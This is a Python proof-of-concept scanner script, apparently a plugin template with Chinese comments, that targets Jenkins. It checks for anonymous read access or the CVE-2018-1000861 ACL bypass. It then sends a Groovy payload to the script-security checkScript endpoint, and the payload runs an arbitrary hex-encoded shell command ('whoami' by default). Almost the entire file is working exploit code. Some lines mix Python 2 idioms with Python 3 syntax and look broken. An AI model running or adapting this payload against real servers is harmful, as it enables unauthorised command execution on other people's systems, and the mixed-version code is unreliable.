# 自定义POC检测脚本模板
# 模块导入
from typing import Optional, Dict, Any

import requests
from enum import Enum

try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'

class mode(Enum):
    ACL_PATCHED = 0
    NOT_JENKINS = 1
    READ_ENABLE = 2
    READ_BYPASS = 3
    ENTRY_NOTFOUND = 999

def _log(msg, fail=False):
    nb = '[*]'
    if fail:
        nb = '[-]'
    # print('%s %s' % (nb, msg))

def _get(url, params=None):
    r = requests.get(url, verify=False, params=params)
    return r.status_code, r.content

def _add_bypass(url):
    return url + 'securityRealm/user/admin/'

def check(url):
    flag, accessible = mode.ACL_PATCHED, False

    status, content = _get(url)
    if status == 200 and 'adjuncts' in content:
        flag, accessible = mode.READ_ENABLE, True
        _log('ANONYMOUS_READ enable!')
    elif status == 403:
        _log('ANONYMOUS_READ disable!')

        status, content = _get(_add_bypass(url))
        if status == 200 and 'adjuncts' in content:
            flag, accessible = mode.READ_BYPASS, True
    else:
        flag = mode.NOT_JENKINS

    if accessible:
        if flag is mode.READ_BYPASS:
            url = _add_bypass(url)
        status, content = _get(url + endpoint)

        if status == 404:
            flag = mode.ENTRY_NOTFOUND

    return flag

def exploit(url, cmd):
    payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % cmd.encode('hex')
    params = {
        'sandbox': True, 
        'value': payload
    }

    status, content = _get(url + endpoint, params)
    if status == 200:
        _log('Exploit success!(it should be :P)')
        return True
    elif status == 405:
        _log('It seems Jenkins has patched the RCE gadget :(')
        return False
    else:
        _log('Exploit fail with HTTP status [%d]' % status, fail=True)
        if 'stack trace' in content:
            for _ in content.splitlines():
                if _.startswith('Caused:'):
                    _log(_, fail=True)
        return False

# 主方法
def vulnerability_check(url: Optional[str])->bool:
    """
    用于被扫描器调用的主方法
    Args:
        url: 由扫描器传入的目标地址
    Return:
        返回True(存在漏洞)或者False(不存在漏洞)
    """
    cmd = "whoami"
    
    try:
        flag = check(url.rstrip('/') + '/')
        if flag is mode.ACL_PATCHED:
            _log('It seems Jenkins is up-to-date(>2.137) :(', fail=True)
            return False
        elif flag is mode.NOT_JENKINS:
            _log('Is this Jenkins?', fail=True)
            return False
        elif flag is mode.READ_ENABLE:
            return exploit(url.rstrip('/') + '/', cmd)
        elif flag is mode.READ_BYPASS:
            _log('Bypass with CVE-2018-1000861!')
            return True
        else:
            _log('The `checkScript` is not found, please try other entries(see refs)', fail=True)
            return False
    except Exception as e:
        _log('Error during vulnerability check: %s' % str(e), fail=True)
        return False
